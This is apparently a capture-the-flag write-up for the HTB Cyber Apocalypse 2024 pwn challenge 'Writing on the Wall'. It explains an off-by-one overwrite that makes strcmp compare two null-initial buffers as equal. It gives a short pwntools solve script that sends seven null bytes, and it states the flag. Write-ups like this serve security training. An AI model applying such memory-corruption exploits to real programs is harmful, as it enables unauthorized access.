# Writing on the Wall - pwn
#### HTB Cyber Apocalypse 2024

#off-by-one

You overwrite at localx, so there will be one byte where you can overwrite into the other variable. So if you set your first by to 0, and the last byte to 0, such that both buffers start wth a null byte. Then when you strcmp it will evalutate to the same string.

## Solve Script
```
from pwn import *
from ctfkit.bp import *

context.binary = './writing_on_the_wall'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def main():
  proc = get_process()

  data = b'\x00' * 7
  proc.sendline(data)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
```
##### Flag: HTB{3v3ryth1ng_15_r34d4bl3}